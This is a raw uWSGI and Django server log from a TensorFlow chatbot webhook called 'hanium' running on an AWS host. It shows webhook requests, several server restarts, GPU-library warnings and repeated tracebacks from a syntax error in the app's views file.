[pid: 2630|app: 0|req: 1/1] 66.249.83.43 () {42 vars in 542 bytes} [Fri Sep  4 06:25:28 2020] POST /webhook/ => generated 181 bytes in 9280 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 2630|app: 0|req: 2/2] 66.102.6.201 () {42 vars in 542 bytes} [Fri Sep  4 06:25:37 2020] POST /webhook/ => generated 181 bytes in 0 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
['chatting']
['chatting']
[[1]]
[[0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1]]
2020-09-04 06:25:38.738102: I tensorflow/compiler/mlir/mlir_graph_optimization_pass.cc:118] None of the MLIR optimization passes are enabled (registered 1)
2020-09-04 06:25:39.041693: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-09-04 06:25:39.043170: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-09-04 06:25:39.044755: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
52.39%   .

[pid: 2630|app: 0|req: 3/3] 66.102.6.201 () {42 vars in 542 bytes} [Fri Sep  4 06:25:38 2020] POST /webhook/ => generated 73 bytes in 1040 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
[pid: 2630|app: 0|req: 4/4] 66.249.83.43 () {42 vars in 542 bytes} [Fri Sep  4 06:26:06 2020] POST /webhook/ => generated 181 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
['chatting']
['chatting']
[[1]]
[[0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1]]
52.39%   .

[pid: 2630|app: 0|req: 5/5] 66.249.83.45 () {42 vars in 542 bytes} [Fri Sep  4 06:26:07 2020] POST /webhook/ => generated 73 bytes in 42 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
[pid: 2630|app: 0|req: 6/6] 66.249.84.13 () {42 vars in 542 bytes} [Fri Sep  4 06:26:58 2020] POST /webhook/ => generated 181 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
['chatting']
['chatting']
[[1]]
[[0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1]]
52.39%   .

[pid: 2630|app: 0|req: 7/7] 66.249.84.13 () {42 vars in 542 bytes} [Fri Sep  4 06:26:59 2020] POST /webhook/ => generated 73 bytes in 43 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
[pid: 2630|app: 0|req: 8/8] 66.249.84.13 () {42 vars in 542 bytes} [Fri Sep  4 06:35:38 2020] POST /webhook/ => generated 181 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
['chatting']
['chatting']
[[1]]
[[0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1]]
52.39%   .

[pid: 2630|app: 0|req: 9/9] 66.249.84.11 () {42 vars in 542 bytes} [Fri Sep  4 06:35:39 2020] POST /webhook/ => generated 73 bytes in 42 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
[pid: 2630|app: 0|req: 10/10] 66.249.84.13 () {42 vars in 542 bytes} [Fri Sep  4 06:37:16 2020] POST /webhook/ => generated 181 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
['chatting']
['chatting']
[[1]]
[[0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1]]
52.39%   .

[pid: 2630|app: 0|req: 11/11] 66.249.84.13 () {42 vars in 542 bytes} [Fri Sep  4 06:37:17 2020] POST /webhook/ => generated 73 bytes in 41 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Fri Sep  4 06:41:11 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1034-aws #36-Ubuntu SMP Tue Aug 18 08:58:43 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x564bfb235cf0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x564bfb235cf0 pid: 2900 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 2900, cores: 1)
2020-09-04 06:41:25.344421: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-09-04 06:41:25.344454: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.


2020-09-04 06:41:33.668396: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-09-04 06:41:33.668429: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-09-04 06:41:33.668448: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-09-04 06:41:33.668659: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-09-04 06:41:33.692212: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199920000 Hz
2020-09-04 06:41:33.692556: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x564c00128d90 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-09-04 06:41:33.692588: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-09-04 06:41:33.979323: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-09-04 06:41:33.980744: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-09-04 06:41:33.982099: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
[pid: 2900|app: 0|req: 1/1] 66.249.83.41 () {42 vars in 542 bytes} [Fri Sep  4 06:41:24 2020] POST /webhook/ => generated 181 bytes in 9288 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 2900|app: 0|req: 2/2] 66.249.84.13 () {42 vars in 542 bytes} [Fri Sep  4 06:41:36 2020] POST /webhook/ => generated 181 bytes in 0 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 2900|app: 0|req: 3/3] 66.249.84.11 () {42 vars in 542 bytes} [Fri Sep  4 06:41:37 2020] POST /webhook/ => generated 74 bytes in 0 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
[pid: 2900|app: 0|req: 4/4] 66.249.83.43 () {42 vars in 542 bytes} [Fri Sep  4 06:41:43 2020] POST /webhook/ => generated 181 bytes in 9 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 2900|app: 0|req: 5/5] 66.249.83.41 () {42 vars in 542 bytes} [Fri Sep  4 06:41:44 2020] POST /webhook/ => generated 74 bytes in 101 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
[pid: 2900|app: 0|req: 6/6] 66.249.84.13 () {42 vars in 542 bytes} [Fri Sep  4 06:42:26 2020] POST /webhook/ => generated 181 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 2900|app: 0|req: 7/7] 66.249.84.11 () {42 vars in 542 bytes} [Fri Sep  4 06:42:26 2020] POST /webhook/ => generated 74 bytes in 0 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
[pid: 2900|app: 0|req: 8/8] 66.249.84.9 () {42 vars in 541 bytes} [Fri Sep  4 06:43:40 2020] POST /webhook/ => generated 181 bytes in 0 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 2900|app: 0|req: 9/9] 66.249.84.11 () {42 vars in 542 bytes} [Fri Sep  4 06:43:41 2020] POST /webhook/ => generated 74 bytes in 0 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Fri Sep  4 06:47:17 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1034-aws #36-Ubuntu SMP Tue Aug 18 08:58:43 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x55aaea9b3cf0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x55aaea9b3cf0 pid: 4747 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 4747, cores: 1)
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 80
    "followupEventInput": {
                        ^
SyntaxError: invalid syntax
[pid: 4747|app: 0|req: 1/1] 66.249.83.45 () {42 vars in 542 bytes} [Fri Sep  4 06:47:23 2020] POST /webhook/ => generated 101890 bytes in 75 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 80
    "followupEventInput": {
                        ^
SyntaxError: invalid syntax
[pid: 4747|app: 0|req: 2/2] 66.102.6.201 () {42 vars in 542 bytes} [Fri Sep  4 06:47:27 2020] POST /webhook/ => generated 101890 bytes in 63 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 80
    "followupEventInput": {
                        ^
SyntaxError: invalid syntax
[pid: 4747|app: 0|req: 3/3] 66.249.84.11 () {42 vars in 542 bytes} [Fri Sep  4 06:47:31 2020] POST /webhook/ => generated 101890 bytes in 63 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 80
    "followupEventInput": {
                        ^
SyntaxError: invalid syntax
[pid: 4747|app: 0|req: 4/4] 66.102.6.205 () {42 vars in 542 bytes} [Fri Sep  4 06:47:35 2020] POST /webhook/ => generated 101890 bytes in 65 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Fri Sep  4 06:48:17 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1034-aws #36-Ubuntu SMP Tue Aug 18 08:58:43 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x563c02394cf0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x563c02394cf0 pid: 4752 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 4752, cores: 1)
2020-09-04 06:48:23.004150: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-09-04 06:48:23.004186: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.


2020-09-04 06:48:31.601641: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-09-04 06:48:31.601673: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-09-04 06:48:31.601689: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-09-04 06:48:31.601908: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-09-04 06:48:31.628187: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199920000 Hz
2020-09-04 06:48:31.628549: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x563c07288590 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-09-04 06:48:31.628568: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-09-04 06:48:32.365045: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-09-04 06:48:32.366465: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-09-04 06:48:32.367825: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
[pid: 4752|app: 0|req: 1/1] 66.102.6.205 () {42 vars in 542 bytes} [Fri Sep  4 06:48:22 2020] POST /webhook/ => generated 181 bytes in 10074 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 4752|app: 0|req: 2/2] 66.249.84.9 () {42 vars in 541 bytes} [Fri Sep  4 06:48:32 2020] POST /webhook/ => generated 181 bytes in 0 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 4752|app: 0|req: 3/3] 66.249.84.9 () {42 vars in 541 bytes} [Fri Sep  4 06:48:32 2020] POST /webhook/ => generated 73 bytes in 0 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
[pid: 4752|app: 0|req: 4/4] 66.102.6.205 () {42 vars in 542 bytes} [Fri Sep  4 06:48:58 2020] POST /webhook/ => generated 181 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 4752|app: 0|req: 5/5] 66.102.6.201 () {42 vars in 542 bytes} [Fri Sep  4 06:48:59 2020] POST /webhook/ => generated 73 bytes in 8 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
[pid: 4752|app: 0|req: 6/6] 66.249.84.11 () {42 vars in 542 bytes} [Fri Sep  4 07:24:04 2020] POST /webhook/ => generated 181 bytes in 105 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 4752|app: 0|req: 7/7] 66.249.84.11 () {42 vars in 542 bytes} [Fri Sep  4 07:24:05 2020] POST /webhook/ => generated 73 bytes in 0 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
[pid: 4752|app: 0|req: 8/8] 66.249.84.13 () {42 vars in 542 bytes} [Fri Sep  4 07:34:23 2020] POST /webhook/ => generated 181 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 4752|app: 0|req: 9/9] 66.249.84.11 () {42 vars in 542 bytes} [Fri Sep  4 07:34:23 2020] POST /webhook/ => generated 73 bytes in 0 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
[pid: 4752|app: 0|req: 10/10] 66.249.84.11 () {42 vars in 542 bytes} [Fri Sep  4 07:34:56 2020] POST /webhook/ => generated 181 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 4752|app: 0|req: 11/11] 66.249.84.11 () {42 vars in 542 bytes} [Fri Sep  4 07:34:56 2020] POST /webhook/ => generated 73 bytes in 0 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Fri Sep  4 07:55:44 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1034-aws #36-Ubuntu SMP Tue Aug 18 08:58:43 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x55a007232cf0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x55a007232cf0 pid: 5086 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 5086, cores: 1)
2020-09-04 07:55:55.954447: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-09-04 07:55:55.954481: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.


2020-09-04 07:56:04.469534: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-09-04 07:56:04.469565: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-09-04 07:56:04.469580: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-09-04 07:56:04.469798: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-09-04 07:56:04.496201: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199920000 Hz
